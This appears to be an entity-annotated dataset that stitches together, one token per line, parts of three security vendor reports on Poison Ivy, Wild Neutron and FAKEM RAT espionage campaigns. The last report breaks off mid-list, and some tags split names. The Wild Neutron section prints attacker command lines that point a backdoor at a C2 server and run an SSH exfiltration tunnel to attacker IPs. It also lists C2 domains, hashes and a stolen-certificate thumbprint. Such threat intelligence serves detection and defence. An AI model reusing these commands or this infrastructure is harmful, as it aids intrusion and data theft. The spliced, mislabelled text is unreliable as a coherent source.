self-extracting
archives
sometimes
sent
to
a
large
number
of
recipients
.

The
Sogu
gang
,
in
contrast
,
use
PDF
and
DOC
files
in
very
tailored
,
targeted
emails
.

The
Sogu
gang
use
a
custom
developed
threat
-
Backdoor.Sogu B_malware.backdoor
,
whereas
the
group
described
in
this
document
use
an
off
the
shelf
threat
-
Poison
Ivy
.

While
the
number
of
Sogu
targets
is
currently
small
relative
to
the
Poison
Ivy
attacks
,
we
continue
to
monitor
their
activities
.

Summary
Numerous
targeted
attack
campaigns
are
occurring
every
week
.

However
,
relative
to
the
total
number
of
attacks
,
few
are
fully
disclosed
.

These
attacks
are
primarily
targeting
private
industry
in
search
of
key
intellectual
property
for
competitive
advantage
,
military
institutions
,
and
governmental
organizations
often
in
search
of
documents
related
to
current
political
events
and
human
rights
organizations
.

This
attack
campaign
focused
on
the
chemical
sector
with
the
goal
of
obtaining
sensitive
documents
such
as
proprietary
designs
,
formulas
,
and
manufacturing
processes
.

Security
Response
Appendix
Example
MD5s
of
PoisonIvy
samples
used
in
these
attacks
:

091457444b7e7899c242c5125ddc0571 B_hash
6e99585c3fbd4f3a55bd8f604cb35f38 B_hash
07e266f7fb3c36a1f3a5c5d2d229a478 B_hash
17e7022496d8092d3ca76ae9524a7260 B_hash
2f37912e7cb6e5c478e6dc3d0e381a24 B_hash
5d075e9536c5494745135c1176981c96 B_hash
76000c77ea9a214f5b2ae8cc387809db B_hash
a98d2c90b9494fc885c7cd35d43666ea B_hash
c128c40bd8acb282288e8138352ce4e1 B_hash
cab66da82594ff5266ac8dd89e3d1539 B_hash
70fcb3446fce23b18d9a12b2ed911e52 B_hash
c53c93a445d751387eb167e5a2b901da B_hash
dd5715cb3b0cdddbe131f03cc08f0f57 B_hash
0f54a9757f1a2fef2b04b776714a7546 B_hash
37f70717f549f1938e5785527e56978d B_hash
31346e5b39ddb095d76071ac86da4c2e B_hash
330ddac1f605ff8abf60880c584ed797 B_hash
457a2a8d0784e9fc8e49f6ef60f7f29e B_hash
87aeec7f7c4ec1b6dc5e6c39b28d8273 B_hash
8d36fd85d9c7d1f4bb170a28cc23498a B_hash
de7e293aa9c4d849dc080f3e87573b24 B_hash
64a4ad90a55e7b6c30c46135435f50a2 B_hash

Any
technical
information
that
is
made
available
by
Symantec
Corporation
is
the
copyrighted
work
of
Symantec
Corporation
and
is
owned
by
Symantec
Corporation
.

NO
WARRANTY .
The
technical
information
is
being
delivered
to
you
as
is
and
Symantec
Corporation
makes
no
warranty
as
to
its
accuracy
or
use
.

Any
use
of
the
technical
documentation
or
the
information
contained
herein
is
at
the
risk
of
the
user
.

Documentation
may
include
technical
or
other
inaccuracies
or
typographical
errors
.

Symantec
reserves
the
right
to
make
changes
without
prior
notice
.

About
Symantec
Symantec
is
a
global
leader
in
providing
security
,
storage
and
systems
management
solutions
to
help
businesses
and
consumers
secure
and
manage
their
information
.

Headquartered
in
Moutain
View
,
Calif.
,
Symantec
has
operations
in
more
than
40
countries
.

More
information
is
available
at
www.symantec.com B_url.normal
.

Copyright

2011
Symantec
Corporation
.

All
rights
reserved
.

Symantec
and
the
Symantec
logo
are
trademarks
or
registered
trademarks
of
Symantec
Corporation
or
its
affiliates
in
the
U.S.
and
other
countries
.

Other
names
may
be
trademarks
of
their
respective
owners
.

About
the
authors
Eric
Chien
is
a
Technical
Director
for
Security
Response
and
Gavin
O'Gorman
is
a
Security
Response
Manager
in
Symantec
.

For
specific
country
offices
and
contact
numbers
,
please
visit
our
Web
site
.

For
product
information
in
the
U.S.
,
call
toll-free
1
(
800
)
745
6054
.

Symantec
Corporation
World
Headquarters
350
Ellis
Street
Mountain
View
,
CA
94043
USA
+1
(
650
)
527-8000
www.symantec.com B_url.normal
Wild B_malware.backdoor
Neutron I
–
Economic
espionage
threat
actor
returns
with
new
tricks

Indicators
of
Compromise
(
IOC
)

A
powerful
threat
actor
known
as
'Wild B_malware.backdoor
Neutron I
'
(
also
known
as
'Jripbot B_malware.backdoor
'
and
'Morpho B_malware.backdoor
'
)
has
been
active
since
at
least
2011
,
infecting
high
profile
companies
for
several
years
by
using
a
combination
of
exploits
,
watering
holes
and
multi-platform
malware
.

The
latest
round
of
attacks
in
2015
uses
a
stolen
code
signing
certificate
belonging
to
Taiwanese
electronics
maker
Acer
and
an
unknown
Flash
Player
exploit
.

Wild B_malware.backdoor
Neutron I
hit
the
spotlight
in
2013
,
when
it
successfully
infected
companies
such
as
Apple
,
Facebook
,
Twitter
and
Microsoft
.

This
attack
took
advantage
of
a
Java
zero-day
exploit
and
used
hacked
forums
as
watering
holes
.

The
2013
incident
was
highly
publicized
and
,
in
the
aftermath
,
the
threat
actor
went
dark
for
almost
one
year
.

#
WildNeutron B_malware.backdoor
is
a
powerful
entity
engaged
in
espionage
,
possibly
for
economic
reasons

Tweet

In
late
2013
and
early
2014
the
attacks
resumed
and
continued
throughout
2015
.

Targets
of
the
new
attacks
include
:

Law
firms

Bitcoin-related
companies

Investment
companies

Large
company
groups
often
involved
in
M
&
A
deals

IT
companies

Healthcare
companies

Real
estate
companies

Individual
users

The
focus
of
these
attacks
suggests
this
is
not
a
nation-state
sponsored
actor
.

However
,
the
use
of
zero-days
,
multi-platform
malware
as
well
as
other
techniques
makes
us
believe
it
's
a
powerful
entity
engaged
in
espionage
,
possibly
for
economic
reasons
.

Older
(
2013
)
campaigns

During
the
2013
attacks
,
the
Wild B_malware.backdoor
Neutron I
actor
successfully
compromised
and
leveraged
the
website
www.iphonedevsdk[.]com B_url.normal
,
which
is
an
iPhone
developers
forum
.

The
attackers
injected
a
script
into
the
forum
that
redirected
visitors
to
another
website
(
min.liveanalytics[.]org B_url.cncsvr
–
currently
SINKHOLED
by
Kaspersky
Lab
)
that
hosted
a
Java
zero-day
exploit
.

A
similar
attack
was
also
found
in
another
forum
dedicated
to
Linux
developers
:

fedoraforum[.]org B_url.cncsvr
.

For
a
more
detailed
analysis
of
these
2013
attacks
,
see
Eric
Romang
's
blog
.

Other
forums
compromised
by
the
Wild B_malware.backdoor
Neutron I
group
and
identified
by
reports
from
the
Kaspersky
Security
Network
include
:

expatforum.com B_url.cncsvr

mygsmindia.com B_url.cncsvr

forum.samdroid.net B_url.cncsvr

emiratesmac.com B_url.cncsvr

forums.kyngdvb.com B_url.cncsvr

community.flexispy.com B_url.cncsvr

ansar1.info B_url.cncsvr

In
particular
,
two
of
these
stand
out
:
'community.flexispy[.]com B_url.cncsvr
'
and
'ansar1[.]info B_url.cncsvr
'
.

The
first
one
is
a
community
ran
by
Flexispy
,
a
company
that
sells
spyware
for
mobile
devices
.

The
second
one
is
a
Jihadist
forum
that
is
currently
closed
.

ansar1[.]info
was
injected
by
Wild B_malware.backdoor
Neutron I
in
2013
Back
in
2013
,
the
attackers
also
leveraged
a
Mac
OS
X
backdoor
,
known
as
OSX/Pintsized B_malware.backdoor
.

This
is
also
described
in
more
detail
in
Eric
Romang
's
excellent
blog
.

The
same
backdoor
,
compiled
for
Win32
,
is
still
being
used
in
the
2015
attacks
.

#
WildNeutron B_malware.backdoor
is
one
of
the
most
unusual
APT
group
we
've
analysed
and
tracked

Tweet

Some
of
the
more
prominent
victims
of
the
2013
attack
include
Twitter
,
Facebook
,
Apple
and
Microsoft
.

These
breaches
were
covered
widely
by
the
press
and
some
affect
companies
,
issued
statements
on
the
incident
(
see
Facebook
's
statement
)
.

The
targeting
of
major
IT
companies
like
Facebook
,
Twitter
,
Apple
and
Microsoft
is
unusual
,
however
,
it
's
not
entirely
unique
.

The
lack
of
victims
in
other
sectors
,
such
as
diplomatic
or
government
institutions
,
is
however
quite
unusual
.2

This
makes
us
believe
this
is
not
a
nation-state
sponsored
attack
.

Technical
analysis

The
malware
set
used
by
the
Wild B_malware.backdoor
Neutron I
threat
actor
has
several
component
groups
,
including
:

A
main
backdoor
module
that
initiates
the
first
communication
with
C
&
C
server

Several
information
gathering
modules

Exploitation
tools

SSH-based
exfiltration
tools

Intermediate
loaders
and
droppers
that
decrypt
and
run
the
payloads

Although
customized
,
some
of
the
modules
seem
to
be
heavily
based
on
open
source
tools
(
e.g.
the
password
dumper
resembles
the
code
of
Mimikatz
and
Pass-The-Hash
Toolkit
)
and
commercial
malware
(
HTTPS
proxy
module
is
practically
identical
to
the
one
that
is
used
by
Hesperbot
)
.

Although
customized
,
some
of
the
modules
seem
to
be
heavily
based
on
open
source
tools
#
WildNeutron B_malware.backdoor

Tweet

All
C
&
C
communication
is
encrypted
with
a
custom
protocol
.

Dropped
executables
,
as
well
as
some
of
the
hardcoded
strings
are
usually
obfuscated
with
XOR
(
depends
on
bot
version
)
.

The
main
backdoor
module
contains
a
number
of
evasion
techniques
,
designed
to
detect
or
time
out
sandboxes
and
emulation
engines
.

Exploitation
–
2015

The
initial
infection
vector
from
the
2014-2015
attacks
is
still
unknown
,
although
there
are
clear
indications
that
the
victims
are
exploited
by
a
kit
that
leverages
an
unknown
Flash
Player
exploit
.

The
following
exploitation
chain
was
observed
in
one
of
the
attacks
:

Site

Paths

hxxp://cryptomag.mediasource.ch/ B_url.cncsvr

/favicon.ico

/msie9html5.jpg

/loader-large.gif

/bootstrap.min.css

/stats.js?d=1434374526478

/autoload.js?styleid=20&langid=5&sid=883f2efa
&
d=1434374526

/banner.html?styleid=19&langid=23&sid=883f2efa
&
d=1434374526

/883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa
&
d=1434374533

/883f2efa/pzixfgne
?
styleid=5
&
langid=25
&
sid=883f2efa
&
d=1434374533

/883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa
&
d=1434374533/

/background.jpg

The
subdomain
cryptomag.mediasource[.]ch B_url.cncsvr
appears
to
have
been
created
for
this
attack
;
it
pointed
to
an
IP
address
associated
with
other
Wild B_malware.backdoor
Neutron I
C
&
Cs
,
highlighted
in
red
below
:

Hosts
resolving
to
66.55.133[.]89 B_ip.cncsvr

While
app.cloudprotect[.]eu B_url.cncsvr
and
ssl.cloudprotect[.]eu B_url.cncsvr
are
two
known
Wild B_malware.backdoor
Neutron I
C
&
Cs
,
cryptomag.mediasource[.]ch
appears
to
have
been
pointed
to
this
IP
for
the
purpose
of
exploitation
.

Another
suspicious
domain
can
be
observed
above
,
secure.pdf-info[.]com B_url.unknown
.

We
have
n't
seen
any
attacks
connected
with
his
hostname
yet
,
however
,
the
name
scheme
indicates
this
is
also
malicious
.

In
another
attack
,
we
observed
a
similar
exploitation
chain
,
however
hosted
on
a
different
website
,
hxxp://find.a-job.today/ B_url.cncsvr
.

In
both
cases
,
the
visitors
browsed
the
website
,
or
arrived
via
what
appears
to
have
been
an
online
advertisement
.

From
there
,
'autoload.js
'
appears
in
both
cases
,
which
redirects
to
another
randomly
named
HTML
file
,
which
eventually
loads
a
randomly
named
SWF
file
.

While
the
group
used
watering
hole
attacks
in
2013
,
it
's
still
unclear
how
victims
get
redirected
to
the
exploitation
kits
in
the
new
2014-2015
attacks
.

Instead
of
Flash
exploits
,
older
Wild B_malware.backdoor
Neutron I
exploitation
and
watering
holes
used
what
was
a
Java
zero-day
at
the
end
of
2012
and
the
beginning
of
2013
,
detected
by
Kaspersky
Lab
products
as
Exploit.Java.CVE-2012-3213.b
.

The
main
malware
dropper

The
functionality
of
the
main
dropper
is
relatively
simple
:
it
decrypts
the
backdoor
executable
(
stored
as
a
resource
and
encrypted
with
a
simple
XOR
0x66
)
,
writes
it
to
a
specified
path
and
then
executes
it
with
parameters
that
are
hardcoded
in
the
dropper
body
.

One
of
the
parameters
is
the
URL
address
of
the
C
&
C
server
,
while
others
contain
various
bot
configuration
options
.

Example
parameters
used
by
the
dropper
:
igfxupt.exe
https://app.cloudprotect[.]eu:443 B_url.cncsvr
/opts
resolv=logs.cloudprotect[.]eu B_url.cncsvr
After
executing
the
main
backdoor
,
the
dropper
is
securely
deleted
by
overwriting
its
content
with
random
numbers
several
times
before
renaming
and
removing
the
file
.

The
main
backdoor
(
aka
'Jripbot B_malware.backdoor
)

This
binary
is
executed
with
the
URL
address
of
the
C
&
C
server
as
a
parameter
;
it
can
also
receive
an
optional
bot
configuration
.

This
information
is
then
double-encrypted
–
first
with
RC4
and
then
with
Windows
CryptProtectData
function
–
and
saved
to
the
registry
.

Before
performing
any
other
activity
,
the
malware
first
runs
its
stalling
code
(
designed
to
outrun
the
emulators
)
,
then
performs
several
anti-sandboxing
checks
and
enters
an
infinite
loop
if
any
unwanted
software
running
in
the
system
is
detected
.

Otherwise
,
it
gathers
some
basic
system
information
:

Version
of
the
operating
system

If
program
is
running
under
WOW64

If
current
user
has
administrator
privileges

Which
security
features
of
Windows
are
enabled

Username
and
computer
name

Server
name
and
LAN
group

Information
about
logical
drives

System
uptime
and
idle
time

Default
web
browser

Proxy
settings

Based
on
some
of
this
information
,
malware
generates
a
unique
ID
for
the
victim
and
starts
the
C
&
C
communication
by
sending
the
ID
value
and
awaiting
commands
.

Backdoor
configuration
options
may
include
proxy
server
address
and
credentials
,
sleeptime/delay
values
and
connection
type
,
but
the
most
interesting
option
is
the
resolv=
[
url
]
option
.

If
this
option
is
set
,
the
malware
generates
a
domain
name
consisting
of
computer
name
,
unique
ID
and
and
the
URL
passed
with
this
option
;
then
it
tries
to
resolve
the
IP
address
of
this
domain
.

We
suspect
this
is
the
method
the
attackers
use
to
send
the
generated
UID
to
the
C
&
C
.

Commands
from
the
C
&
C
may
instruct
the
bot
to
perform
following
actions
:

Change
the
current
directory
to
the
requested
one

Execute
an
arbitrary
command
in
the
command
line

Set
the
autorun
value
for
itself
in
the
registry

Delete
the
autorun
value
for
itself
in
the
registry

Shred
requested
file
(
overwrite
the
file
content
with
random
numbers
,
overwrite
the
file
name
with
zeroes
and
then
delete
it
)

Download
file
from
the
Internet
and
save
it
(
optionally
encrypted
)
to
the
disk

Install
or
uninstall
additional
malware
plugins

Collect
and
send
system
information

Enumerate
drives

Set
sleeptime
value

Update
the
configuration

Update
itself

Quit

Older
versions
of
this
backdoor
,
used
in
the
2013
attacks
,
had
a
bit
more
functionality
:

Password
harvesting

Port
scanning

Collecting
screenshots

Pushing
files
to
C
&
C

Reverse
shell

These
features
were
removed
from
the
newer
backdoor
versions
that
are
used
in
recent
attacks
.

Instead
,
malware
developers
decided
to
implement
a
plugin
mechanism
and
run
different
tools
for
different
tasks
.

This
suggests
a
clear
shift
towards
more
flexible
modular
architecture
.

#
WildNeutron B_malware.backdoor
hide
the
C
&
C
address
by
encrypting
it
in
the
registry
with
machine-dependent
information

Tweet

In
terms
of
functionality
,
the
main
backdoor
is
no
different
from
many
other
Remote
Access
Tools
(
RATs
)
.

What
really
stands
out
is
the
attacker
's
carefulness
to
hide
the
C
&
C
address
,
by
encrypting
it
in
the
registry
with
machine-dependent
information
.

Also
notable
is
the
ability
to
recover
from
a
C
&
C
shutdown
by
contacting
a
dynamically
generated
domain
name
,
which
only
the
attackers
know
in
advance
,
as
it
is
directly
tied
to
each
unique
victim
.

According
to
the
timestamp
of
the
samples
the
distribution
is
as
follows
:

Each
backdoor
appears
to
contain
an
internal
version
number
,
which
ranges
from
11000
to
16000
in
the
latest
samples
.

This
allows
us
to
trace
the
following
evolutionary
map
:

Backdoors
used
in
the
2013
attacks
:

MD5

1582d68144de2808b518934f0a02bfd6 B_hash

29
Nov
2012

30
Nov
2012

14ba21a3a0081ef60e676fd4945a8bdc B_hash

0fa3657af06a8cc8ef14c445acd92c0f B_hash

09
Jan
2013

11000

12000

13000

javacpl.exe

327168

javacpl.exe

329728

javacpl.exe

343552

Timestamp

Version

Filename

Size

Backdoors
used
in
2014
and
2015
attacks
:

MD5

95ffe4ab4b158602917dd2a999a8caf8 B_hash

342887a7ec6b9f709adcb81fef0d30a3 B_hash

dee8297785b70f490cc00c0763e31b69 B_hash

f0fff29391e7c2e7b13eb4a806276a84 B_hash

14014

15013

Timestamp

Version

Filename

13
Dec
2013

20
Jun
2014

02
Aug
2013
(
possibly
fake
)

27
Oct
2014

RtlUpd.exe

16010

IgfxUpt.exe

16017

Size

LiveUpdater.exe

302592

FlashUtil.exe

302592

291328

253952

The
installers
also
have
a
version
number
,
which
indicates
the
following
evolution
:

MD5

1f5f5db7b15fe672e8db091d9a291df0  B_hash

48319e9166cda8f605f9dce36f115bc8  B_hash

Timestamp

16
Dec
2011

28
Sep
2012

Version

1.4.1

1.5.0

088472f712d1491783bbad87bcc17c48  B_hash

ee24a7ad8d137e54b854095188de0bbf  B_hash

12
Apr
2013

07
Jan
2014

1.6.3

1.6.4

Lateral
movement

After
installing
the
main
backdoor
and
establishing
initial
C2
communication
,
the
attackers
use
a
range
of
different
tools
to
extract
sensitive
data
and
control
the
victim
's
machine
.

These
tools
include
a
password
harvesting
trojan
,
a
reverse-shell
backdoor
and
customized
implementations
of
OpenSSH
,
WMIC
and
SMB
.

Sometimes
,
they
only
drop
a
simple
perl
reverse
shell
and
use
various
collection
methods
to
retrieve
credentials
from
a
set
of
machines
,
escalate
privileges
,
and
fan
out
across
a
network
from
there
.

Besides
these
tools
,
there
is
also
a
number
of
small
utility
modules
of
different
functionalities
,
from
loaders
and
configuration
tools
,
to
file
shredders
and
network
proxies
.

It
's
also
worth
noting
that
this
threat
actor
heavily
relies
on
already
existing
code
,
using
publicly
available
open
source
applications
,
as
well
as
Metasploit
tools
and
leaked
malware
sources
,
to
build
its
own
toolset
.

Some
of
these
tools
are
designed
to
work
under
Cygwin
and
come
together
with
the
Cygwin
API
DLL
,
which
may
suggest
that
the
attackers
feel
more
comfortable
when
working
in
a
Linux-like
environment
.

SSH B_malware.backdoor
tunnel I
backdoor

During
the
2014/2015
attacks
,
we
observed
the
attackers
deploying
custom
,
OpenSSH-based
Win32
tunnel
backdoors
that
are
used
to
exfiltrate
large
amounts
of
data
in
a
reliable
manner
.

These
tunnel
backdoors
are
written
as
'updt.dat
'
and
executed
with
two
parameters
,
-z
and
-p.
These
specify
the
IP
to
connect
to
and
the
port
.

Despite
the
port
number
443
,
the
connection
is
SSH
:

/d
/u
/c
updt.dat
-z
185.10.58.181 B_ip.cncsvr
-p
443

/d
/u
/c
updt.dat
-z
46.183.217.132 B_ip.cncsvr
-p
443

/d
/u
/c
updt.dat
-z
217.23.6.13 B_ip.cncsvr
-p
443

For
authentication
,
the
SSH B_malware.backdoor
tunnel I
backdoor
contains
a
hardcoded
RSA
private
key
.

Stolen
certificate

During
the
2015
attacks
,
Wild B_malware.backdoor
Neutron I
used
a
dropper
signed
with
a
stolen
,
yet
valid
Acer
Incorporated
certificate
.

Acer
signature
on
Wild B_malware.backdoor
Neutron I
dropper

The
abused
certificate
has
the
following
properties
:

Serial
:
5c
c5
3b
a3
e8
31
a7
df
dc
7c
28
d5
15
8f
c3
80

Thumbprint
:
0d
85
91
41
ee
9a
0c
6e
72
5f
fe
6b
cf
c9
9f
3e
fc
c3
fc
07

The
dropper
(
dbb0ea0436f70f2a178a60c4d8b791b3
)
appears
to
have
been
signed
on
June
15
,
2015
.

It
drops
a
Jripbot B_malware.backdoor
backdoor
as
'IgfxUpt.exe
'
and
configures
it
to
use
the
C
&
C
'app.cloudprotect[.]eu B_url.cncsvr
'
.

#
WildNeutron B_malware.backdoor
used
a
dropper
signed
with
a
stolen
,
yet
valid
Acer
Incorporated
certificate

Tweet

We
have
worked
with
Symantec
,
Verisign
and
Acer
to
revoke
the
compromised
certificate
.

Victims
and
statistics

The
Wild B_malware.backdoor
Neutron I
attacks
appear
to
have
a
highly
targeted
nature
.

During
our
investigation
,
we
have
been
able
to
identify
several
victims
across
11
countries
and
territories
:

France

Russia

Switzerland

Germany

Austria

Palestine

Slovenia

Kazakhstan

UAE

Algeria

United
States

The
victims
for
the
2014-2015
versions
are
generally
IT
and
real
estate/investment
companies
and
in
both
cases
,
a
small
number
of
computers
have
been
infected
throughout
the
organizations
.

The
attackers
appear
to
have
updated
the
malware
implant
and
deployed
some
additional
tools
,
however
,
we
have
n't
observed
serious
lateral
movement
in
these
cases
.

Attribution

The
targeting
of
various
companies
,
without
a
government
focus
,
makes
us
believe
this
is
not
a
nation
state
sponsored
APT
.

The
attackers
have
also
shown
an
interest
in
investment
related
targets
,
which
indicate
knowledge
and
skills
to
exploit
such
information
on
the
market
to
turn
it
into
financial
advantages
.

In
some
of
the
samples
,
the
encrypted
configuration
includes
a
Romanian
language
string
#
WildNeutron B_malware.backdoor

Tweet

In
some
of
the
samples
,
the
encrypted
configuration
includes
a
Romanian
language
string
,
which
is
used
to
mark
the
end
of
the
C
&
C
communication
:

Interestingly
,
'La
revedere
'
means
'goodbye
'
in
Romanian
.

In
addition
to
that
,
we
found
another
non-English
string
which
is
the
latin
transcription
of
the
russian
word
Успешно
(
'uspeshno
'
-
>
'successfully
'
)
;
this
string
is
written
to
a
pipe
after
executing
a
C2
command
.

We
found
another
non-English
string
which
is
the
latin
transcription
of
the
russian
word
#
WildNeutron B_malware.backdoor

Tweet

One
of
the
samples
has
an
internal
name
of
'WinRAT-Win32-Release.exe
'
.

This
seems
to
indicate
the
authors
are
calling
the
malware
'WinRAT
'
.

More
information
about
the
Wild B_malware.backdoor
Neutron I
attribution
is
available
to
Kaspersky
Intelligence
Services
customers
.

Contact
:
intelreports@kaspersky.com

Conclusions

Compared
to
other
APT
groups
,
Wild B_malware.backdoor
Neutron I
is
one
of
the
most
unusual
ones
we
've
analysed
and
tracked
.

Active
since
2011
,
the
group
has
been
using
at
least
one
zero-day
exploit
,
custom
malware
and
tools
and
managed
to
keep
a
relatively
solid
opsec
which
so
far
eluded
most
attribution
efforts
.

Their
targeting
of
major
IT
companies
,
spyware
developers
(
FlexiSPY
)
,
jihadist
forums
(
the
'Ansar
Al-Mujahideen
English
Forum
'
)
and
Bitcoin
companies
indicate
a
flexible
yet
unusual
mindset
and
interests
.

Some
of
group
's
distinctive
features
include
:

Use
of
open
source
tools
and
leaked
sources
of
other
malware

Use
of
stolen
certificate
from
Acer
Incorporated
to
sign
malware

Use
of
cross
platform
zero-day
exploit
(
Java
and
Flash
)
followed
by
cross
platform
payload
reverse
shell
(
Perl
)
for
initial
penetration

Use
of
*NIX
code
ported
to
Windows
through
Cygwin

Heavy
use
of
SSH
for
exfiltration
,
a
commonly
used
*NIX
administration
tool

Use
of
CryptProtectData
API
to
keep
C
&
C
URLs
secret

Simple
command
line
interface
,
built
around
all
malware
components
,
utilizing
named
pipes
for
communication
between
modules
;

Auxiliary
tools
are
written
in
C
and
most
of
them
contain
a
built-in
help
,
which
may
be
printed
by
executing
the
binary
with
a
'–pleh
'
parameter

We
continue
to
track
the
Wild B_malware.backdoor
Neutron I
group
,
which
is
still
active
as
of
June
2015
.

Kaspersky
products
detect
the
malware
used
in
the
attacks
as
:
HEUR:Trojan.Win32.WildNeutron.gen
,
Trojan.Win32.WildNeutron
.

*
,
Trojan.Win32.JripBot
.

*
,
HEUR:Trojan.Win32.Generic

Read
more
about
how
Kaspersky
Lab
products
can
help
to
protect
you
from
Wild B_malware.backdoor
Neutron I
threat
actor
here
:

Wild B_malware.backdoor
Neutron I
in
the
Wild B_malware.backdoor
:
perhaps
you
're
his
next
prey

Indicators
of
Compromise
(
IOCs
)

Known
malicious
hostnames
and
domains
:

ddosprotected.eu B_url.cncsvr

updatesoft.eu B_url.cncsvr

app.cloudprotect.eu B_url.cncsvr

fw.ddosprotected.eu B_url.cncsvr

logs.cloudprotect.eu B_url.cncsvr

ssl.cloudprotect.eu B_url.cncsvr

ssl.updatesoft.eu B_url.cncsvr

adb.strangled.net B_url.cncsvr

digitalinsight-ltd.com B_url.cncsvr

ads.digitalinsight-ltd.com B_url.cncsvr

cache.cloudbox-storage.com B_url.cncsvr

cloudbox-storage.com B_url.cncsvr

clust12-akmai.net B_url.cncsvr

corp-aapl.com B_url.cncsvr

fb.clust12-akmai.net B_url.cncsvr

fbcbn.net B_url.cncsvr

img.digitalinsight-ltd.com B_url.cncsvr

jdk-update.com B_url.cncsvr

liveanalytics.org B_url.cncsvr

min.liveanalytics.org B_url.cncsvr B_url.cncsvr

pop.digitalinsight-ltd.com B_url.cncsvr

ww1.jdk-update.com B_url.cncsvr

find.a-job.today B_url.cncsvr B_url.cncsvr

cryptomag.mediasource.ch B_url.cncsvr

Known
malicious
IPs
:

185.10.58.181 B_ip.cncsvr

46.183.217.132 B_ip.cncsvr

64.187.225.231 B_ip.cncsvr

62.113.238.104 B_ip.cncsvr

66.55.133.89 B_ip.cncsvr

217.23.6.13 B_ip.cncsvr

Known
file
names
:

%
APPDATA%\Roaming\FlashUtil.exe

%
APPDATA%\Roaming\Acer\LiveUpdater.exe

%
APPDATA%\Roaming\Realtek\RtlUpd.exe

%
ProgramData%\Realtek\RtlUpd.exe

%
APPDATA%\Roaming\sqlite3.dll
(
UPX
packed
)

%
WINDIR%\winsession.dll

%
APPDATA

%
\appdata\local\temp\teamviewer\version9\update.exe

%
SYSTEMROOT%\temp\_dbg.tmp

%
SYSTEMROOT%\temp\ok.tmp

C:\windows\temp\debug.txt

C:\windows\syswow64\mshtaex.exe

%
SYSROOT%\System32\mshtaex.exe

%
SYSROOT%\System32\wdigestEx.dll

%
SYSROOT%\System32\dpcore16t.dll

%
SYSROOT%\System32\iastor32.exe

%
SYSROOT%\System32\mspool.dll

%
SYSROOT%\System32\msvcse.exe

%
SYSROOT%\System32\mspool.exe

C
:
\Program
Files
(
x86)\LNVSuite\LnrAuth.dll

C
:
\Program
Files
(
x86)\LNVSuite\LnrAuthSvc.dll

C
:
\Program
Files
(
x86)\LNVSuite\LnrUpdt.exe

C
:
\Program
Files
(
x86)\LNVSuite\LnrUpdtP.exe
DF39527~.tmp

Named
pipes
:

\\.\pipe\winsession
\\.\pipe\lsassw

Events
&
mutexes
:
Global\LnrRTPDispatchEvents
_Winlogon_TCP_Service
Trend
Micro
Incorporated

Research
Paper

2013

FAKEM B_malware.backdoor
RAT I

Malware
Disguised
as
Windows®

Messenger
and
Yahoo
!
®
Messenger

By
:
Nart
Villeneuve

Jessa
dela
Torre

Contents

Introduction
...........................................................................................................................1

Distribution
............................................................................................................................2

Installation
.............................................................................................................................3

Backdoor
................................................................................................................................3

Network
Traffic
Encryption
..............................................................................................
5

Infrastructure........................................................................................................................7
Conclusion
............................................................................................................................
8

Introduction

The
perpetrators
of
targeted
attacks
aim
to
maintain
persistent
presence
in
a
target
network
in
order
to
extract
sensitive
data
when
needed
.

To
maintain
persistent
presence
,
attackers
seek
to
blend
in
with
normal
network
traffic
and
use
ports
that
are
typically
allowed
by
firewalls
.

As
a
result
,
many
of
the
malware
used
in
targeted
attacks
utilize
the
HTTP
and
HTTPS
protocols
to
appear
like
web
traffic
.

However
,
while
these
malware
do
give
attackers
full
control
over
a
compromised
system
,
they
are
often
simple
and
configured
to
carry
out
a
few
commands
.

Attackers
often
use
remote
access
Trojans
(
RATs B_malware.backdoor
)
,
which
typically
have
graphical
user
interfaces
(
GUIs
)
and
remote
desktop
features
that
include
directory
browsing
,
file
transfer
,
and
the
ability
to
take
screenshots
and
activate
the
microphone
and
web
camera
of
a
compromised
computer
.

Attackers
often
use
publicly
available
RATs B_malware.backdoor
like
Gh0st B_malware.backdoor
,
PoisonIvy B_malware.backdoor
,
Hupigon B_malware.backdoor
,
and
DRAT B_malware.backdoor
,
and
'closed-released
'
RATs B_malware.backdoor
like
MFC
Hunter
and
PlugX.1
However
,
the
network
traffic
these
RATs B_malware.backdoor
produce
is
well-known
and
easily
detectable
although
attackers
still
successfully
use
them.2
Attackers
always
look
for
ways
to
blend
their
malicious
traffic
with
legitimate
traffic
to
avoid
detection
.

We
found
a
family
of
RATs B_malware.backdoor
that
we
call
'FAKEM
'
that
make
their
network
traffic
look
like
various
protocols
.

Some
variants
attempt
to
disguise
network
traffic
to
look
like
Windows®
Messenger
and
Yahoo
!
®
Messenger
traffic
.

Another
variant
tries
to
make
the
content
of
its
traffic
look
like
HTML
.

While
the
disguises
the
RATs B_malware.backdoor
use
are
simple
and
distinguishable
from
legitimate
traffic
,
they
may
be
just
good
enough
to
avoid
further
scrutiny
.

1
Gh0st B_malware.backdoor
:
http://download01.norman.no/documents/ThemanyfacesofGh0stRat.pdf B_url.normal
and
http://www.mcafee.com/ca/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf  B_url.normal
;
PoisonIvy B_malware.backdoor
:
https://media.blackhat.com/bh-eu-10/presentations/Dereszowski/BlackHat-EU-2010-Dereszowski-Targeted-Attacks-slides.pdf B_url.normal
;
Hupigon B_malware.backdoor
:
http://www.f-secure.com/v-descs/backdoor_ B_url.normal
w32_hupigon.shtml
;
DRAT B_malware.backdoor
:
http://blog.trendmicro.com/trendlabs-security-intelligence/
watering-holes-and-zero-day-attacks/
;
MFC
Hunter
:
http://blog.trendmicro.com/trendlabs-security-intelligence/japan-us-defense-industries-among-targeted-entities-in-latest-attack/ B_url.normal
;
and
PlugX
:
http://about-threats.trendmicro.com/us/webattack/112/Pulling+the+Plug+on+PlugX B_url.normal

2
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-detecting-apt-activity-with-network-traffic-analysis.pdf B_url.normal

1
|
FAKEM B_malware.backdoor
RAT I

Distribution

All
three
versions
of
the
FAKEM B_malware.backdoor
RAT I
that
we
investigated
were
distributed
via
spear-phishing
emails
using
social
engineering
to
lure
targets
into
executing
a
malicious
attachment
.

While
we
observed
the
use
of
different
themes
,
the
content
of
the
emails
were
always
interesting
to
potential
targets
.

FIGURE
1
:
Sample
spear-phishing
emails
with
attachments
that
drop
FAKEM B_malware.backdoor
RAT I

The
malicious
attachments
were
most
often
Microsoft®
Word®
documents
with
code
that
exploits
the
following
vulnerabilities
:

•
CVE-2010-3333
:
RTF
Stack
Buffer
Overflow
Vulnerability
addressed
in
Microsoft
Security
Bulletin
MS10-087.3

•
CVE-2012-0158
:
